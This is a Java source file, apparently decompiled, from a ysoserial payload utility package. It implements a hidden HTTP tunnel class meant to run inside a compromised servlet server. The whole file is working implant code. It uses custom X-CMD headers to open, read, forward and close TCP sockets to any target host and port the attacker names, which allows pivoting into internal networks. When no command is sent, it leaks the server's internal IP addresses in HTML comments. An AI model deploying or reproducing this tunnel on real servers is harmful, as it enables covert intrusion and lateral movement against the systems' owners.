package ysoserial.payloads.util;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import javax.servlet.ServletOutputStream;

public class Tunnel extends BaseX3 {
   public Tunnel() {
   }

   public boolean c() throws Exception {
      String var1 = this.r.getHeader("X-CMD");
      String var2 = this.r.getHeader("user-agent") + "\n";
      String var3;
      if (var1 != null) {
         this.rp.setHeader("X-STATUS", "OK");
         int var4;
         if (var1.compareTo("CONNECT") == 0) {
            try {
               var3 = this.r.getHeader("X-TARGET");
               var4 = Integer.parseInt(this.r.getHeader("X-PORT"));
               SocketChannel var5 = SocketChannel.open();
               var5.connect(new InetSocketAddress(var3, var4));
               var5.configureBlocking(false);
               this.ss.setAttribute("socket", var5);
               this.rp.setHeader("X-STATUS", "OK");
            } catch (UnknownHostException var11) {
               this.rp.setHeader("X-ERROR", var11.getMessage());
               this.rp.setHeader("X-STATUS", "FAIL");
            } catch (IOException var12) {
               this.rp.setHeader("X-ERROR", var12.getMessage());
               this.rp.setHeader("X-STATUS", "FAIL");
            }
         } else {
            SocketChannel var16;
            if (var1.compareTo("DISCONNECT") == 0) {
               var16 = (SocketChannel)this.ss.getAttribute("socket");

               try {
                  var16.socket().close();
               } catch (Exception var10) {
               }

               this.ss.invalidate();
            } else if (var1.compareTo("READ") == 0) {
               var16 = (SocketChannel)this.ss.getAttribute("socket");

               try {
                  ByteBuffer var17 = ByteBuffer.allocate(512);
                  int var19 = var16.read(var17);

                  ServletOutputStream var6;
                  for(var6 = this.rp.getOutputStream(); var19 > 0; var19 = var16.read(var17)) {
                     var6.write(var17.array(), 0, var19);
                     var6.flush();
                     var17.clear();
                  }

                  this.rp.setHeader("X-STATUS", "OK");
                  var6.flush();
                  var6.close();
               } catch (Exception var15) {
                  this.rp.setHeader("X-ERROR", var15.getMessage());
                  this.rp.setHeader("X-STATUS", "FAIL");
               }
            } else if (var1.compareTo("FORWARD") == 0) {
               var16 = (SocketChannel)this.ss.getAttribute("socket");

               try {
                  var4 = this.r.getContentLength();
                  byte[] var20 = new byte[var4];
                  this.r.getInputStream().read(var20, 0, var4);
                  ByteBuffer var22 = ByteBuffer.allocate(var4);
                  var22.clear();
                  var22.put(var20);
                  var22.flip();

                  while(var22.hasRemaining()) {
                     var16.write(var22);
                  }

                  this.rp.setHeader("X-STATUS", "OK");
               } catch (Exception var14) {
                  this.rp.setHeader("X-ERROR", var14.getMessage());
                  this.rp.setHeader("X-STATUS", "FAIL");
                  var16.socket().close();
               }
            }
         }
      } else {
         try {
            var3 = "";
            Enumeration var21 = null;

            try {
               var21 = NetworkInterface.getNetworkInterfaces();
            } catch (SocketException var9) {
            }

            while(var21 != null && var21.hasMoreElements()) {
               NetworkInterface var23 = (NetworkInterface)var21.nextElement();
               Enumeration var7 = var23.getInetAddresses();

               while(var7.hasMoreElements()) {
                  InetAddress var8 = (InetAddress)var7.nextElement();
                  if (!var8.isLoopbackAddress() && !var8.isLinkLocalAddress() && !var8.isMulticastAddress()) {
                     String var18 = var8.getHostAddress();
                     if (16 > var18.length()) {
                        var3 = var3 + "," + var18;
                     }
                  }
               }
            }

            this.print("<!-- ip:" + var3 + "," + var2 + " -->");
         } catch (Exception var13) {
         }

         this.print("<!-- _xx_xx_ -->");
      }

      return true;
   }
}
